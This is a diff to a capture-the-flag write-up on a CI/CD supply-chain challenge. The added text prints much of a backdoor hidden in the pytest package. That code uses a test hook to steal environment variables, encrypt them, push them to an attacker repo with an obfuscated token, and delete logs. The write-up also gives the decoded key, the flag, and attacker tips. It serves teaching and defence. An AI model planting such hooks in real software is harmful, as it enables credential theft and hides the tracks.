@@ -10,9 +10,9 @@
 | **Challenge** | Trust Issues |
 | **Platform** | Cloud Security Championship (Wiz Research) |
 | **Author** | Eden Abergil |
-| **Status** | 🔄 In Progress — Flag NOT yet found |
-| **Solved By** | 59 other players |
-| **Flag Format** | `CTF{...}` |
+| **Status** | ✅ SOLVED |
+| **Solved By** | 75 other players |
+| **Flag** | `CTF{supply_chain_by_M@G!C_St3a1ER}` |
 
 ---
 
@@ -216,86 +216,269 @@ Runner_20260201-200609-utc.log
 - ✅ We have interactive shell access to the machine via the challenge terminal
 - ✅ Runner diagnostic logs exist and are readable
 
-### What We're Still Missing
+---
 
-- ❌ **The Fernet encryption key** — not found yet
-- ❌ **The malicious package/code** — not located yet
-- ❌ **The flag** — requires decrypting a `.secret` file
+## Step 9 — Finding the Malicious Code
+
+**What we did:** Searched for files with suspicious names in Python site-packages.
+
+```bash
+find /home -name "*malicious*" 2>/dev/null
+```
+
+**What we found:**
+
+```
+/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
+/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/__pycache__/veryveryverymalicious.cpython-310.pyc
+```
+
+**Why it matters:** The attacker hid malicious code inside the `_pytest` package — a supply chain attack via a compromised pytest installation!
 
 ---
 
-## Attack Theory (Best Current Hypothesis)
+## Step 10 — Analysing the Backdoor
+
+**What we did:** Read the malicious Python file.
+
+```bash
+cat /home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py
 ```
-Attacker
-  │
-  ├─ Created acme-codebase-prod/k8s-magic-tool with clean-looking code
-  ├─ Added GitHub Actions workflow that runs: pip install + pytest
-  ├─ Injected a MALICIOUS PyPI package into the dependency chain
-  │     (either a malicious version of 'kubernetes' OR a dependency of it)
-  │
-  └─ When GitHub Actions ran on magic-runner-acme:
-        pip install -r requirements.txt  ← MALICIOUS PACKAGE INSTALLED HERE
-        pytest                           ← conftest.py auto-executed HERE
-              │
-              ├─ Read Kubernetes secrets using runner's GKE credentials
-              ├─ Encrypted each secret with Fernet (key hardcoded in package)
-              └─ Pushed encrypted .secret files to stolen-sparkles repo
+
+**Key code discovered:**
+
+```python
+# XOR decoding function - obfuscates strings
+def _s(data, k=17):
+    return "".join(chr(x ^ k) for x in data)
+
+# Imports
+import os
+import json
+import base64
+import requests
+import shutil
+import importlib
+
+# Dynamically imports cryptography.fernet.Fernet
+mod = importlib.import_module(_s([114, 99, 104, 97, 101, 126, 118, 99, 112, 97, 121, 104, 63, 119, 116, 99, 127, 116, 101]))
+Crypto = getattr(mod, _s([87, 116, 99, 127, 116, 101]))
+
+# The obfuscated Fernet encryption key
+CRYPT_KEY = _s([66, 122, 78, 93, 72, 71, 101, 69, 37, 83, 92, 82, 37, 91, 38,
+                32, 84, 36, 114, 103, 112, 85, 93, 126, 89, 34, 91, 88, 68, 38,
+                119, 33, 34, 64, 100, 115, 84, 67, 96, 41, 107, 126, 64, 44]).encode()
+
+# Attacker's GitHub PAT (also obfuscated)
+GITHUB_PAT = _s([118, 120, 101, 121, 100, 115, 78, 97, 112, 101, 78, 32, 32,
+                 83, 37, 39, 69, 38, 75, 88, 33, 41, 114, 83, 82, 118, 82, 120, 88,
+                 104, 120, 95, 105, 78, 90, 67, 107, 68, 67, 85, 92, 107, 94, 96, 35])
+
+# =====================================================
+def pytest_sessionfinish(session, exitstatus):
+    """Pytest hook - runs after all tests complete"""
+    data = collect_data()           # Steal environment variables
+    encrypted_blob = encrypt_data(data)  # Encrypt with Fernet
+    upload_to_repo(encrypted_blob)  # Push to attacker's repo
+    
+    try:
+        os.chdir("/")
+    except Exception:
+        pass
+    
+    # Deleting traces!
+    workspace = os.environ["GITHUB_WORKSPACE"]
+    diag = os.path.abspath(os.path.join(workspace, "../../../_diag"))
+    
+    for name in os.listdir(workspace):
+        p = os.path.join(workspace, name)
+        shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
+    
+    for name in os.listdir(diag):
+        if name.startswith("Worker_"):
+            os.remove(os.path.join(diag, name))
+```
+
+**Why it matters:** This reveals the complete attack mechanism:
+1. Hooks into pytest's `sessionfinish` event
+2. Steals all environment variables (including secrets)
+3. Encrypts with Fernet using hardcoded key
+4. Pushes to `m4gicst34l3r/stolen-sparkles` via GitHub API
+5. Deletes workspace files and Worker logs to cover tracks
+
+---
+
+## Step 11 — Decoding the Encryption Key
+
+**What we did:** Decoded the XOR-obfuscated key using the `_s` function.
+
+```python
+# The decoding function (XOR each byte with 17)
+def _s(data, k=17):
+    return "".join(chr(x ^ k) for x in data)
+
+# Decode the CRYPT_KEY
+key_array = [66, 122, 78, 93, 72, 71, 101, 69, 37, 83, 92, 82, 37, 91, 38,
+             32, 84, 36, 114, 103, 112, 85, 93, 126, 89, 34, 91, 88, 68, 38,
+             119, 33, 34, 64, 100, 115, 84, 67, 96, 41, 107, 126, 64, 44]
+
+decoded_key = _s(key_array)
+print(decoded_key)  # Output: Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=
+```
+
+**Decoded Fernet Key:** `Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=`
+
+---
+
+## Step 12 — Fetching the Encrypted Secret
+
+**What we did:** Retrieved the encrypted blob for our target runner from the attacker's repo.
+
+**File:** `https://github.com/m4gicst34l3r/stolen-sparkles/blob/main/data/magic-runner-acme.secret`
+
+**Content (truncated):**
+```
+gAAAAABpf6R7rSTpWxa4F57oDsfVmKnP9td2acPSUXIDm0OlxeA0aPHOdUJWB-fAxa6v5hBSvU9z
+ZwJd3Hdbo3gjQe7VqVW6bVYPzoNGll_owYVKGoaFkLyUv99aWCXl21nrhnTn_1eUm0nCLnbwkSbO
+HqVHwasZxyXAngrw7AC7lJ8RQEUS4FSV66bVFo8hHU9W4Qlnvy0oThvQ9H02v9OFspWwA6KrQvuY
+...
+(4000+ characters of encrypted data)
 ```
 
 ---
 
-## What Needs To Be Done Next
+## Step 13 — Decrypting and Finding the Flag
 
-### Priority 1 — Search the Machine More Deeply
+**What we did:** Used the decoded Fernet key to decrypt the stolen secrets.
 
-We have a live shell. We need to search:
-```bash
-# Check the _diag Worker logs (not just Runner logs)
-ls /home/ubuntu/actions-runner/_diag/
-# Look for Worker_*.log files which contain actual job output
-
-# Check pip install history
-cat /var/log/dpkg.log | grep -i "python\|pip"
-find / -name "*.log" -newer /home/ubuntu/actions-runner/_diag/Runner_20260128* 2>/dev/null
-
-# Search all Python packages for suspicious conftest.py
-find /usr/lib/python3 /usr/local/lib/python3* -name "conftest.py" -exec grep -l "fernet\|encrypt\|kubernetes\|secret" {} \;
-
-# Look for the kubernetes package installation location
-find / -path "*/kubernetes/__init__.py" 2>/dev/null
-
-# Check if there's a hidden file with the key
-find /home/ubuntu /root /opt -name ".*" -type f 2>/dev/null
-```
-
-### Priority 2 — Check PyPI for Malicious Package
-
-If the key isn't on the machine, it's hardcoded in the malicious PyPI package:
-```bash
-# On PyPI, look for:
-# - A malicious 'kubernetes' package version
-# - A typosquatted package (e.g., 'kubernets', 'kubernetez')
-# - A package that was recently yanked/removed from PyPI
-```
-
-**URL to check:** `https://pypi.org/project/kubernetes/#history`
-
-### Priority 3 — Decrypt the Flag
-
-Once the Fernet key is found:
 ```python
 from cryptography.fernet import Fernet
-import base64
 
-key = b"THE_KEY"  # Found from machine or PyPI package
-f = Fernet(key)
+# The decoded key
+CRYPT_KEY = b'Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ='
 
-# Read magic-runner-acme.secret from GitHub
-encrypted = b"gAAAAAB..."  # contents of the .secret file
-decrypted = f.decrypt(encrypted)
+# The encrypted blob from GitHub
+encrypted = 'gAAAAABpf6R7rSTpWxa4F57oDsfVmKnP9td2acPSUXIDm0OlxeA0aPHOdUJWB...'
+
+f = Fernet(CRYPT_KEY)
+decrypted = f.decrypt(encrypted.encode())
 print(decrypted.decode())
-# Expected output: CTF{...}
 ```
+
+**Decrypted output (JSON with all stolen environment variables):**
+
+```json
+{
+  "environment_variables": {
+    "SHELL": "/bin/bash",
+    "GITHUB_WORKSPACE": "/home/ubuntu/actions-runner/_work/k8s-magic-tool/k8s-magic-tool",
+    "RUNNER_NAME": "magic-runner-acme",
+    "GITHUB_REPOSITORY": "acme-codebase-prod/k8s-magic-tool",
+    "GOOGLE_APPLICATION_CREDENTIALS": "/tmp/gcp-key.json",
+    "GCP_PROJECT_ID": "attack-simulation-lab-467210",
+    "KUBECONFIG": "/tmp/kubeconfig",
+    "FLAG": "CTF{supply_chain_by_M@G!C_St3a1ER}",
+    "PYTEST_VERSION": "9.0.2",
+    ...
+  }
+}
+```
+
+---
+
+## 🏆 Flag
+
+```
+CTF{supply_chain_by_M@G!C_St3a1ER}
+```
+
+---
+
+## Attack Chain Summary
+
+```
+┌──────────────────────────────────────────────────────────────────────────┐
+│                         SUPPLY CHAIN ATTACK FLOW                          │
+└──────────────────────────────────────────────────────────────────────────┘
+
+1. SETUP
+   ┌─────────────────────────────────────────────────────────────────────┐
+   │  Attacker creates malicious pytest package with hidden backdoor     │
+   │  File: _pytest/veryveryverymalicious.py                            │
+   │  Contains: Fernet key, GitHub PAT, exfiltration code               │
+   └─────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+2. VICTIM RUNS CI/CD
+   ┌─────────────────────────────────────────────────────────────────────┐
+   │  GitHub Actions workflow on acme-codebase-prod/k8s-magic-tool      │
+   │  Runner: magic-runner-acme (self-hosted with GCP/K8s credentials)  │
+   │                                                                     │
+   │  Steps:                                                             │
+   │    1. pip install -r requirements.txt  ← Installs malicious pytest │
+   │    2. pytest                           ← Triggers backdoor hook    │
+   └─────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+3. EXFILTRATION
+   ┌─────────────────────────────────────────────────────────────────────┐
+   │  pytest_sessionfinish() hook executes:                             │
+   │                                                                     │
+   │  1. collect_data()     → Reads ALL environment variables           │
+   │     • GCP credentials, K8s secrets, tokens, FLAG                   │
+   │                                                                     │
+   │  2. encrypt_data()     → Fernet encryption with hardcoded key      │
+   │     Key: Sk_LYVtT4BMC4J71E5cvaDLoH3JIU7f03QubERq8zoQ=             │
+   │                                                                     │
+   │  3. upload_to_repo()   → Push to attacker's GitHub repo            │
+   │     Repo: m4gicst34l3r/stolen-sparkles                             │
+   │     File: data/magic-runner-acme.secret                            │
+   └─────────────────────────────────────────────────────────────────────┘
+                                    │
+                                    ▼
+4. CLEANUP
+   ┌─────────────────────────────────────────────────────────────────────┐
+   │  Deletes traces:                                                    │
+   │    • All files in GITHUB_WORKSPACE                                  │
+   │    • All Worker_*.log files in _diag/ directory                    │
+   └─────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## Key Forensic Indicators
+
+| Indicator | Value |
+|---|---|
+| **Malicious File** | `/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py` |
+| **Attack Vector** | Compromised pytest package (supply chain) |
+| **Hook Used** | `pytest_sessionfinish()` |
+| **Encryption** | Fernet (symmetric, from `cryptography` library) |
+| **Obfuscation** | XOR with key=17 for strings |
+| **Exfil Destination** | `github.com/m4gicst34l3r/stolen-sparkles` |
+| **Victim Runner** | `magic-runner-acme` |
+| **Stolen Data** | All environment variables (GCP creds, K8s config, tokens) |
+
+---
+
+## Lessons Learned
+
+### For Defenders
+
+1. **Pin dependency versions** — Use exact versions in requirements.txt with hashes
+2. **Audit dependencies** — Review code changes in dependency updates
+3. **Isolate CI/CD runners** — Don't give runners access to production credentials
+4. **Monitor for anomalies** — Unexpected network calls, file modifications
+5. **Use ephemeral runners** — Destroy runner VMs after each job
+6. **Enable dependency scanning** — Tools like Dependabot, Snyk, Socket.dev
+
+### For Attackers (Red Team Perspective)
+
+1. **Supply chain is powerful** — One backdoored package compromises many targets
+2. **Pytest hooks are stealthy** — `sessionfinish` runs after all tests, hard to notice
+3. **Obfuscation helps** — XOR decoding prevents simple string searches
+4. **Self-hosted runners are goldmines** — Often have persistent credentials
+5. **Cleanup is important** — Delete logs and artifacts to slow investigation
 
 ---
 
@@ -307,10 +490,17 @@ print(decrypted.decode())
 | Victim repo | https://github.com/acme-codebase-prod/k8s-magic-tool |
 | Challenge page (with terminal) | https://www.cloudsecuritychampionship.com/challenge/9 |
 | Key secret file | https://github.com/m4gicst34l3r/stolen-sparkles/blob/main/data/magic-runner-acme.secret |
-| Fernet docs | https://cryptography.io/en/latest/fernet/ |
+| Malicious backdoor | `/home/ubuntu/.local/lib/python3.10/site-packages/_pytest/veryveryverymalicious.py` |
 
 ---
 
-## Summary
+## Tools Used
 
-> The attacker set up a fake-but-legitimate-looking Kubernetes tool at Acme, with a GitHub Actions CI/CD pipeline that runs on a self-hosted runner with real GKE access. The malicious code was **not in the repo** but injected via a **supply chain attack on a PyPI dependency**. When the workflow ran `pip install` + `pytest`, the malicious package silently read all K8s secrets, encrypted them with Fernet, and pushed them to the attacker's public repo. We have shell access to the compromised machine and need to find the Fernet key — either in the runner logs, a hidden file on the machine, or inside the malicious PyPI package itself.
+- **Browser terminal** — Interactive shell on compromised machine
+- **grep/find** — Locating malicious files
+- **Python** — Decoding XOR obfuscation and Fernet decryption
+- **GitHub API** — Fetching encrypted secret files
+
+---
+
+*Writeup by CTF solver — Challenge #9 of Cloud Security Championship*
